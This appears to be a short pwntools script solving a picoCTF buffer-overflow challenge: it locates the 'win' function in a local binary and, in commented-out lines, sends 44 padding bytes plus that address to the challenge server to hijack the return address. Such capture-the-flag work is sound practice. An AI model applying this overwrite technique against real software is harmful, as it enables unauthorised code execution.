from pwn import *
#r = remote('saturn.picoctf.net', 64148)
#r.recvuntil('drill')
e = elf.ELF('./vuln')
#payload = b'A'*44 + b'\xf6\x91\x04\x08'
#r.sendline(payload)

#r.interactive()

return_address = p32(e.symbols['win'])

print(return_address)


#\xf6\x91\x04\x08 == e.symbols['win']